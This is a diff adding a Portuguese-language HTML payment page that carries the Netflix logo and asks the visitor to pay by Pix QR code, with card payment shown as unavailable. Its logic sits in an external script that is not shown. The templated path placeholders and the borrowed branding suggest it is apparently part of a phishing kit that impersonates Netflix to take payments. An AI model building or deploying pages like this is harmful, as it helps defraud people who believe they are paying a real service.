@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Pagamento</title>
+    <link rel="icon" href="/assets/icons/nficon2023.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/assets/css/pagamento.css">
+    <script>
+        var prefix_ = "/{{path_}}/{{prefix}}";
+        console.log(prefix_)
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style> 
+.loading-overlay {
+    display: none;  
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    z-index: 1000;
+}
+
+.carregando {
+    margin: 200px auto;
+}
+
+h1 {
+    font-family: 'Actor', sans-serif;
+    color: #FFF;
+    font-size: 16px;
+    letter-spacing: 1px;
+    font-weight: 200;
+    text-align: center;
+}
+
+.carregando span {
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    display: inline-block;
+    position: absolute;
+    left: 50%;
+    margin-left: -10px;
+    -webkit-animation: 3s infinite linear;
+    -moz-animation: 3s infinite linear;
+    -o-animation: 3s infinite linear;
+}
+
+.carregando span:nth-child(2) {
+    background: #E84C3D;
+    -webkit-animation: kiri 1.2s infinite linear;
+    -moz-animation: kiri 1.2s infinite linear;
+    -o-animation: kiri 1.2s infinite linear;
+}
+
+.carregando span:nth-child(3) {
+    background: #F1C40F;
+    z-index: 100;
+}
+
+.carregando span:nth-child(4) {
+    background: #2FCC71;
+    -webkit-animation: kanan 1.2s infinite linear;
+    -moz-animation: kanan 1.2s infinite linear;
+    -o-animation: kanan 1.2s infinite linear;
+}
+
+@-webkit-keyframes kanan {
+    0% { -webkit-transform: translateX(20px); }
+    50% { -webkit-transform: translateX(-20px); }
+    100% { -webkit-transform: translateX(20px); z-index: 200; }
+}
+
+@-moz-keyframes kanan {
+    0% { -moz-transform: translateX(20px); }
+    50% { -moz-transform: translateX(-20px); }
+    100% { -moz-transform: translateX(20px); z-index: 200; }
+}
+
+@-o-keyframes kanan {
+    0% { -o-transform: translateX(20px); }
+    50% { -o-transform: translateX(-20px); }
+    100% { -o-transform: translateX(20px); z-index: 200; }
+}
+
+@-webkit-keyframes kiri {
+    0% { -webkit-transform: translateX(-20px); z-index: 200; }
+    50% { -webkit-transform: translateX(20px); }
+    100% { -webkit-transform: translateX(-20px); }
+}
+
+@-moz-keyframes kiri {
+    0% { -moz-transform: translateX(-20px); z-index: 200; }
+    50% { -moz-transform: translateX(20px); }
+    100% { -moz-transform: translateX(-20px); }
+}
+
+@-o-keyframes kiri {
+    0% { -o-transform: translateX(-20px); z-index: 200; }
+    50% { -o-transform: translateX(20px); }
+    100% { -o-transform: translateX(-20px); }
+}
+
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+    </header>
+    <div class="payment-page">
+        <header class="headeres">
+            <h1>Escolha sua Forma de Pagamento</h1>
+        </header>
+        <main class="payment-options">
+            <div class="payment-option">
+                <input type="radio" id="pix" name="payment-method" value="pix">
+                <label for="pix" class="payment-label">
+                    <img alt="Pix" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIHZpZXdCb3g9IjAgMCA0OCA0OCI+CjxwYXRoIGZpbGw9IiM0ZGI2YWMiIGQ9Ik0xMS45LDEyaC0wLjY4bDguMDQtOC4wNGMyLjYyLTIuNjEsNi44Ni0yLjYxLDkuNDgsMEwzNi43OCwxMkgzNi4xYy0xLjYsMC0zLjExLDAuNjItNC4yNCwxLjc2CWwtNi44LDYuNzdjLTAuNTksMC41OS0xLjUzLDAuNTktMi4xMiwwbC02LjgtNi43N0MxNS4wMSwxMi42MiwxMy41LDEyLDExLjksMTJ6Ij48L3BhdGg+PHBhdGggZmlsbD0iIzRkYjZhYyIgZD0iTTM2LjEsMzZoMC42OGwtOC4wNCw4LjA0Yy0yLjYyLDIuNjEtNi44NiwyLjYxLTkuNDgsMEwxMS4yMiwzNmgwLjY4YzEuNiwwLDMuMTEtMC42Miw0LjI0LTEuNzYJbDYuOC02Ljc3YzAuNTktMC41OSwxLjUzLTAuNTksMi4xMiwwbDYuOCw2Ljc3QzMyLjk5LDM1LjM4LDM0LjUsMzYsMzYuMSwzNnoiPjwvcGF0aD48cGF0aCBmaWxsPSIjNGRiNmFjIiBkPSJNNDQuMDQsMjguNzRMMzguNzgsMzRIMzYuMWMtMS4wNywwLTIuMDctMC40Mi0yLjgzLTEuMTdsLTYuOC02Ljc4Yy0xLjM2LTEuMzYtMy41OC0xLjM2LTQuOTQsMAlsLTYuOCw2Ljc4QzEzLjk3LDMzLjU4LDEyLjk3LDM0LDExLjksMzRIOS4yMmwtNS4yNi01LjI2Yy0yLjYxLTIuNjItMi42MS02Ljg2LDAtOS40OEw5LjIyLDE0aDIuNjhjMS4wNywwLDIuMDcsMC40MiwyLjgzLDEuMTcJbDYuOCw2Ljc4YzAuNjgsMC42OCwxLjU4LDEuMDIsMi40NywxLjAyczEuNzktMC4zNCwyLjQ3LTEuMDJsNi44LTYuNzhDMzQuMDMsMTQuNDIsMzUuMDMsMTQsMzYuMSwxNGgyLjY4bDUuMjYsNS4yNglDNDYuNjUsMjEuODgsNDYuNjUsMjYuMTIsNDQuMDQsMjguNzR6Ij48L3BhdGg+Cjwvc3ZnPg==" class="payment-icon">
+                    <div class="payment-info">
+                        <h2>Pix</h2>
+                        <p>Pagamento instantâneo via QR Code.</p>
+                    </div>
+                </label>
+            </div>
+            <div class="payment-option">
+                <input type="radio" id="credit-card" name="payment-method" value="credit-card" disabled>
+                <div class="unavailable">Indisponível</div>
+                <label for="credit-card" class="payment-label">
+                    <img width="50" height="50" src="https://img.icons8.com/isometric/50/bank-card-back-side.png" alt="Cartão de Crédito" class="payment-icon">
+                    <div class="payment-info">
+                        <h2>Cartão de Crédito</h2>
+                        <p>Pague com seu cartão de crédito.</p>
+                    </div>
+                </label>
+            </div>
+        </main>
+        <footer class="footer">
+            <button id="continue-btn" class="continue-button">Continuar</button>
+        </footer>
+    </div>
+    <div id="loading-overlay" class="loading-overlay" style= "display: none">
+        <div class="carregando">
+            <span></span>
+            <span></span>
+            <span></span>
+            <span> </span>
+        </div>
+        <h1>Aguarde enquanto carregamos...</h1>
+    </div>
+</div>
+
+ 
+    <script src="/assets/js/pagamento.js"></script>
+</body>
+</html>
